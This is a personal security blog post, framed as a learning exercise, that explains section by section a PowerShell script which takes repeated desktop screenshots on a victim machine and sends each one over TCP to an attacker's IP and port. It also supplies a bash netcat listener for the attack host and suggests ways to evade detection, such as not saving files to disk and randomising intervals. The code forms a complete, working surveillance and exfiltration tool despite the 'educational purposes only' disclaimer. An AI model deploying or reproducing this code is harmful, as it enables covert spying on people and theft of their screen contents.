---
layout: post
date: 2025-01-13
title: "Script Kiddie Discovers PowerShell"
categories: []
tags: []
---

## Introduction
This blog is just be playing with PowerShell and learning how the syntax works. Anything here should be used for EDUCATIONAL PURPOSES ONLY. Enjoy
## PowerShell Screenshotting Script
### Comments
The [PowerShell script](https://github.com/Coontzy1/HacknScripts/blob/master/screenshotter.ps1) essentially takes screenshots of the victim's desktop, saves them, and sends those screenshots to an attacker listener. I'm going to break the code section by section. Most well-written PowerShell scripts include a beginning section where the script is summarized (SYNOPSIS). Next, there is an included example of how to run the script. Lastly, there are detailed definitions of parameters. None of this is necessary for script functionality, but is simply for readability.
!["PowerShell Comments"](/assets/img/Script-Kiddie-Dicovers-PowerShell/Comments.png) _PowerShell Comments_
### Parameters
After the comments, there are four parameters assigned. This is done in the `param` block. There is a `Mandatory` check on each of the parameters. If arguments are not provided for the mandatory parameters, the script will prompt for input and halt execution. For the non-mandatory parameters, if they are not provided, a default value is used. The default for COUNT and INTERVAL are both 10 for 10 screenshots every 10 seconds.
```powershell
param (
    [Parameter(Mandatory=$false)]
    [int]$COUNT = 10,      # Default to 10 if not supplied

    [Parameter(Mandatory=$false)]
    [int]$INTERVAL = 10,     # Default to 10 if not supplied

    [Parameter(Mandatory=$true)]
    [string]$DestIP,    # Destination IP address

    [Parameter(Mandatory=$true)]
    [int]$DestPort      # Destination port
)
```
### Add-Types
The Add-Type cmdlet in PowerShell is used to load .NET types (or assemblies) into the current session, allowing you to use the .NET functionality in your PowerShell script. These are kinda like libraries in other languages. `System.Drawing` is needed for working with images, graphics, and drawing operations.
```powershell
Add-Type -AssemblyName System.Drawing
```
### Desktop-Path
Defining the desktop path isn't completely necessary, but this is what I choose to use to place the screenshots. I am getting this using `System.Environment` and combining the name with `Screenshots` using `System.IO.Path`. However, this could also be done using `$env:userprofile`. Then, it tests it exists, and if not, it creates it, then redirects output to `Null`.
```powershell
$desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath("Desktop"), "Screenshots")
if (-not (Test-Path $desktopPath)) {
    New-Item -ItemType Directory -Path $desktopPath | Out-Null
}
```
### Monitor Resolution
So, this part was an absolute nightmare. Originally, I found a way to do this using Windows Forms and grabbing the screen resolution. Then, it was being difficult because of scaled window resolutions. There are a few different other methods I tried, but to keep the script simple and make it not completely ChatGPT'd, I opted for the simplest route. I queried the video controller using WMI and obtained the resolution information from there. Notably, this means I am also only screenshotting one (1) monitor. Adjustments could be made here to properly calculate the multi-monitor resolutions, but, meh. Additionally, the future code used from grabbing the screenshots REALLY did NOT like the Unsigned Integer type. Therefore, the values were type-casted using `[int]`. 
Note about typecasting here
```powershell
$controller = Get-WmiObject win32_videocontroller | Select-Object CurrentHorizontalResolution, CurrentVerticalResolution
$totalWidth = [int]$controller.CurrentHorizontalResolution
$totalHeight = [int]$controller.CurrentVerticalResolution
```
!["Screenshot showing Unsigned integer"](/assets/img/Script-Kiddie-Dicovers-PowerShell/GetType_1.png) _Unsigned Integer_
!["Screenshot showing signed integer after type-casting"](/assets/img/Script-Kiddie-Dicovers-PowerShell/GetType_2.png) _Signed Integer_
### Screenshotting Loop
The actual work is all done here in the screenshotting loop. The screenshot count is done within a for loop. Then, between each screenshot, there is a sleep interval. Both of these are defined in the parameters. There is basic code for creating a new object based on the size of the monitor resolution. This is then saved to desktop path. The second part of this reads in the image file form the screenshots folder and creates a connection the the attacker's listener IP and port. After the graphic is saved, the objects are disposed of to free resources. Additionally, after the file is sent, the connection is closed. Meaning, this opens/closes the connection each time. 
```powershell
for ($i = 1; $i -le $COUNT; $i++) {
    # Create a bitmap for the resolution
    $bmp = New-Object System.Drawing.Bitmap($totalWidth, $totalHeight)
    $graphics = [System.Drawing.Graphics]::FromImage($bmp)

    # Capture the full desktop
    $graphics.CopyFromScreen(0, 0, 0, 0, $bmp.Size)
    $bmp.Save("$desktopPath\screenshot_$i.png")
    Write-Host "Screenshot $i saved successfully." -ForegroundColor Green

    # Dispose of resources
    $graphics.Dispose()
    $bmp.Dispose()

    # Send the screenshot over TCP
    $fileBytes = [System.IO.File]::ReadAllBytes("$desktopPath\screenshot_$i.png")
    $client = New-Object System.Net.Sockets.TcpClient
    $client.Connect($DestIP, $DestPort)
    $stream = $client.GetStream()
    $stream.Write($fileBytes, 0, $fileBytes.Length)
    Write-Host "File screenshot_$i.png sent to $DestIP : $DestPort" -ForegroundColor Red
    $stream.Close()
    $client.Close()

    Start-Sleep -Seconds $INTERVAL
}
```
### Notes
If this was a real tool that was not supposed to be detected, using a different system for saving the images would be necessary to prevent saving them on the desktop. It could (probably) just be directly sent and never saved. Additionally, variations in sleep could be added to make the taking/sending of screenshot times a bit more random. Although, since this really isn't doing anything malicious, there is no flags from Windows Defender for sending multiple images repeatedly. 
## Receiving Script
To receive the images, I am using a [Bash script](https://github.com/Coontzy1/HacknScripts/blob/master/screenshotter_receive.sh) on my attack host. This script simply uses a loop to output each image into a separate file. Then, uses `Ctrl + C` to kill the script when finished. This script requires a port to listen on defined when running the script. Because I am lazy, the very last image from the script is somewhat corrupted because it redirects nothing into an image file.
```bash
#!/bin/bash
# This script will ooutput the actual jpg images recieved from the powershell screenshotting script

# Exists while loop when CTRL + C
get_me_out() {
    exit 0
}
trap get_me_out SIGINT

mkdir -p output_images

# Check if the port number is supplied as an argument
if [[ -z $1 ]]; then
    echo "Usage: $0 <port>"
    exit 1
fi

PORT=$1 # Set the port number from the first argument
echo "Listening on port $PORT..."
while true; do
   nc -lnvp "$PORT" > "output_images/received_$(date +%s).jpg"
done
```
## Running the Scripts
First, running the listener script:
!["PowerShell Comments"](/assets/img/Script-Kiddie-Dicovers-PowerShell/listener_start.png) _Starting the listener_
Then, starting the PowerShell script.
!["PowerShell Comments"](/assets/img/Script-Kiddie-Dicovers-PowerShell/script_running_output.png) _Running the PowerShell Script_
Then, running the PowerShell script:
!["PowerShell Comments"](/assets/img/Script-Kiddie-Dicovers-PowerShell/script_received.png) _Listener Receiving Connections (images)_
Lastly, viewing the output images folder on the attack host, it shows our entire desktop is screenshotted.
!["PowerShell Comments"](/assets/img/Script-Kiddie-Dicovers-PowerShell/sent_image.png) _Screenshot Image on Attack Host_



